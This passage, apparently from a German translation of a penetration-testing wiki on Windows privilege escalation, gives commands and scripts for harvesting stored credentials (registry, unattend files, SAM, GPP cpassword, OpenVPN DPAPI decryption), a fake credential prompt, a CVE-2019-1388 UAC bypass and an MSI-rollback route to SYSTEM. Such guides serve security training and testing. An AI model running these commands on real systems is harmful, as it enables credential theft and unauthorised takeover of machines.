$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installer werden **mit SYSTEM-Privilegien ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Schlüssel in der Registry

SSH private keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein, daher solltest du prüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn du in diesem Pfad einen Eintrag findest, ist es wahrscheinlich ein gespeicherter SSH-Key. Er ist verschlüsselt gespeichert, kann aber leicht mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Mehr Informationen zu dieser Technik hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und du möchtest, dass er beim Booten automatisch startet, führe aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige ssh-Keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh bei einer Maschine anzumelden. Der Registry-Schlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen key-Authentifizierung nicht identifiziert.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Du kannst diese Dateien auch mit **metasploit** suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-Backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Anmeldedaten
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Cached GPP Pasword

Früher war eine Funktion verfügbar, die es ermöglichte, benutzerdefinierte lokale Administrator-Konten auf einer Gruppe von Maschinen über Group Policy Preferences (GPP) bereitzustellen. Diese Methode hatte jedoch erhebliche Sicherheitslücken. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert waren, von jedem Domain-User eingesehen werden. Zweitens konnten die Passwörter innerhalb dieser GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Privilegien zu erlangen.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien nach einem nicht leeren Feld "cpassword" durchsucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zur GPP und zum Speicherort der Datei und hilft so bei der Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Verwendung von crackmapexec, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit Zugangsdaten:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Anmeldedaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Zugangsdaten fragen

Du kannst den Benutzer immer **auffordern, seine Zugangsdaten einzugeben, oder sogar die Zugangsdaten eines anderen Benutzers**, wenn du denkst, dass er sie kennen könnte (beachte, dass **den Client** direkt nach den **Zugangsdaten** zu **fragen** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die vor einiger Zeit **Passwörter** im **Klartext** oder in **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Suche alle vorgeschlagenen Dateien:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Zugangsdaten im RecycleBin

Du solltest auch den Bin überprüfen, um dort nach Zugangsdaten zu suchen

Um von mehreren Programmen gespeicherte **Passwörter wiederherzustellen** kannst du verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Keys mit Zugangsdaten**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**openssh-Schlüssel aus der registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Du solltest nach dbs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort vielleicht einige **Passwörter gespeichert sind**.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine Technologie, die in das Windows-Betriebssystem integriert ist und die **Kommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird **über eine class ID (CLSID)** identifiziert und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die über interface IDs (IIDs) identifiziert werden.

COM-Klassen und Schnittstellen sind in der registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese registry wird erstellt, indem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** zu **HKEY\CLASSES\ROOT** zusammengeführt werden.

Innerhalb der CLSIDs dieser registry findest du den untergeordneten registry-Schlüssel **InProcServer32**, der einen **default value** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) oder **Neutral** (Thread Neutral) sein kann.

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Im Wesentlichen könntest du, wenn du **eine der DLLs überschreiben** kannst, die ausgeführt werden sollen, **Privilegien eskalieren**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu lernen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generische Passwortsuche in Dateien und registry**

**Dateiinhalte durchsuchen**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suche nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Registrierung nach Schlüssel-Namen und Passwörtern durchsuchen**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe. Dieses Plugin führt automatisch jedes metasploit POST module aus, das im Opfer nach credentials sucht.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die passwords enthalten und auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um passwords aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **sessions**, **usernames** und **passwords** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stellen Sie sich vor, dass **ein als SYSTEM laufender Prozess einen neuen Prozess öffnet** (`OpenProcess()`) **mit vollem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Rechten, wobei alle offenen Handles des Hauptprozesses geerbt werden**.\
Wenn Sie dann **vollen Zugriff auf den niedrig privilegierten Prozess** haben, können Sie das **offene Handle zum privilegierten Prozess**, das mit `OpenProcess()` erstellt wurde, greifen und **Shellcode injizieren**.\
[Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
[Lesen Sie diesen **anderen Beitrag für eine vollständigere Erklärung, wie man mehr offene Handler von Prozessen und Threads testet und missbraucht, die mit unterschiedlichen Berechtigungsstufen geerbt wurden (nicht nur voller Zugriff)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speichersegmente, auch **pipes** genannt, ermöglichen die Prozesskommunikation und den Datentransfer.

Windows stellt eine Funktion namens **Named Pipes** bereit, die es nicht verwandten Prozessen ermöglicht, Daten zu teilen, sogar über unterschiedliche Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur, mit Rollen, die als **named pipe server** und **named pipe client** definiert sind.

Wenn Daten über eine pipe von einem **Client** gesendet werden, hat der **Server**, der die pipe eingerichtet hat, die Möglichkeit, die **Identität** des **Clients** zu **übernehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Das Identifizieren eines **privilegierten Prozesses**, der über eine pipe kommuniziert, die Sie nachahmen können, bietet die Möglichkeit, **höhere Privilegien zu erlangen**, indem Sie die Identität dieses Prozesses annehmen, sobald er mit der von Ihnen eingerichteten pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs finden Sie nützlich [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem ermöglicht das folgende Tool, **eine Named-Pipe-Kommunikation mit einem Tool wie burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool erlaubt es, alle pipes aufzulisten und anzuzeigen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) im Servermodus stellt `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter authentifizierter Client kann den mailslot-basierten Async-Event-Pfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Write** in jede vorhandene Datei umzuwandeln, die von `NETWORK SERVICE` schreibbar ist, dann Telephony-Adminrechte erlangen und eine beliebige DLL als Dienst laden. Vollständiger Ablauf:

- `ClientAttach` mit `pszDomainUser`, gesetzt auf einen schreibbaren vorhandenen Pfad → der Dienst öffnet ihn über `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für Async-Event-Writes.
- Jedes Event schreibt das vom Angreifer kontrollierte `InitContext` aus `Initialize` auf dieses Handle. Registrieren Sie eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), lösen Sie `TRequestMakeCall` aus (`Req_Func 121`), holen Sie sie über `GetAsyncEvents` ab (`Req_Func 0`), und deregistrieren/stoppen Sie sie dann, um deterministische Writes zu wiederholen.
- Fügen Sie sich selbst zu `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` hinzu, verbinden Sie sich erneut und rufen Sie dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Schauen Sie sich die Seite **[https://filesec.io/](https://filesec.io/)** an

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergeleitet werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wenn Sie als Benutzer eine Shell erhalten, können möglicherweise geplante Aufgaben oder andere Prozesse ausgeführt werden, die **Anmeldedaten in der Command line übergeben**. Das folgende Script erfasst alle zwei Sekunden die Prozess-Command lines und vergleicht den aktuellen Zustand mit dem vorherigen, wobei es alle Unterschiede ausgibt.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Oberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" aus einem unprivilegierten Benutzer heraus auszuführen.

Dadurch ist es möglich, Rechte zu eskalieren und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Zusätzlich ist es nicht nötig, etwas zu installieren, und die während des Prozesses verwendete Binary ist von Microsoft signiert und herausgegeben.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, ist es notwendig, die folgenden Schritte auszuführen:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Von Administrator Medium zu High Integrity Level / UAC Bypass

Lies das, um **über Integrity Levels zu lernen**:


{{#ref}}
integrity-levels.md
{{#endref}}

Dann **lies das, um über UAC und UAC bypasses zu lernen:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Von Arbitrary Folder Delete/Move/Rename zu SYSTEM EoP

Die in [**diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem Exploit-Code [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, die Rollback-Funktion von Windows Installer zu missbrauchen, um legitime Dateien während des Deinstallationsprozesses durch bösartige zu ersetzen. Dafür muss der Angreifer einen **malicious MSI installer** erstellen, der verwendet wird, um den Ordner `C:\Config.Msi` zu hijacken. Dieser wird später von Windows Installer genutzt, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei die Rollback-Dateien so verändert werden, dass sie das bösartige Payload enthalten.

Die zusammengefasste Technik ist folgende:

1. **Stage 1 – Vorbereitung für den Hijack (`C:\Config.Msi` leer lassen)**

- Step 1: Installiere die MSI
- Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **"UAC Compliant"**, damit ein **non-admin user** ihn ausführen kann.
- Halte nach der Installation einen **handle** auf die Datei offen.

- Step 2: Deinstallation starten
- Deinstalliere dieselbe `.msi`.
- Der Deinstallationsprozess beginnt damit, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien umzubenennen (rollback backups).
- **Polle den offenen File-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Step 3: Benutzerdefiniertes Synchronisieren
- Die `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)**, die:
- signalisiert, wenn `.rbf` geschrieben wurde.
- Dann auf ein anderes Event **wartet**, bevor die Deinstallation fortgesetzt wird.

- Step 4: Löschen von `.rbf` blockieren
- Wenn signalisiert wird, öffne die `.rbf`-Datei ohne `FILE_SHARE_DELETE` — das **verhindert, dass sie gelöscht werden kann**.
- Dann **zurück signalisieren**, damit die Deinstallation beendet werden kann.
- Windows Installer kann die `.rbf` nicht löschen, und weil nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Step 5: `.rbf` manuell löschen
- Du (Angreifer) löschst die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer**, bereit für den Hijack.

> An diesem Punkt **löse die SYSTEM-level arbitrary folder delete vulnerability aus**, um `C:\Config.Msi` zu löschen.

2. **Stage 2 – Ersetzen der Rollback-Skripte durch bösartige**

- Step 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **weak DACLs** (z. B. Everyone:F) und **halte einen handle offen** mit `WRITE_DAC`.

- Step 7: Anderen Installationslauf ausführen
- Installiere die `.msi` erneut, mit:
- `TARGETDIR`: beschreibbarer Speicherort.
- `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird verwendet, um **rollback** erneut auszulösen, wobei `.rbs` und `.rbf` gelesen werden.

- Step 8: Auf `.rbs` überwachen
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Erfasse den Dateinamen.

- Step 9: Vor dem Rollback synchronisieren
- Die `.msi` enthält eine **custom install action (`SyncBeforeRollback`)**, die:
- ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- Dann vor dem Fortfahren **wartet**.

- Step 10: Weak ACL erneut anwenden
- Nach dem Empfang des Events **`.rbs created`**:
- Windows Installer **wendet starke ACLs** auf `C:\Config.Msi` erneut an.
- Da du aber noch immer einen handle mit `WRITE_DAC` hast, kannst du **weak ACLs** erneut anwenden.

> ACLs werden **nur beim Öffnen des Handles** durchgesetzt, daher kannst du weiterhin in den Ordner schreiben.

- Step 11: Gefälschte `.rbs` und `.rbf` ablegen
- Überschreibe die `.rbs`-Datei mit einem **fake rollback script**, das Windows anweist:
- deine `.rbf`-Datei (malicious DLL) in einen **privileged location** zu restaurieren (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` mit einer **malicious SYSTEM-level payload DLL** ab.

- Step 12: Rollback auslösen
- Signalisiere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass sie die Installation absichtlich an einem bekannten Punkt fehlschlagen lässt.
- Dadurch beginnt der **rollback**.

- Step 13: SYSTEM installiert deine DLL
- Windows Installer:
- liest deine bösartige `.rbs`.
- kopiert deine `.rbf`-DLL an den Zielort.
- Jetzt hast du deine **malicious DLL in einem SYSTEM-loaded path**.

- Final Step: SYSTEM-Code ausführen
- Starte eine vertrauenswürdige **auto-elevated binary** (z. B. `osk.exe`), die die DLL lädt, die du hijacked hast.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von Arbitrary File Delete/Move/Rename zu SYSTEM EoP

Die eigentliche MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **ganzen Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Vulnerability nur **arbitrary file deletion** erlaubt?

Du könntest die **NTFS internals** ausnutzen: Jeder Ordner hat einen versteckten alternativen Datenstrom namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den **`::$INDEX_ALLOCATION`-Stream** eines Ordners **löschst**, **entfernt NTFS den gesamten Ordner** aus dem Dateisystem.

Das kannst du mit Standard-APIs zum Löschen von Dateien machen, wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *file* delete API aufrufst, **löscht sie den Ordner selbst**.

### From Folder Contents Delete to SYSTEM EoP
Was ist, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber es **erlaubt das Löschen des *contents* eines vom Angreifer kontrollierten Ordners**?

1. Schritt 1: Ein Lockvogel-Ordner und -Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **löst der oplock aus** und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
- Dadurch wird `folder1` geleert, ohne den oplock zu brechen.
- Lösche `file1.txt` nicht direkt — dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in ein **junction** umwandeln:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
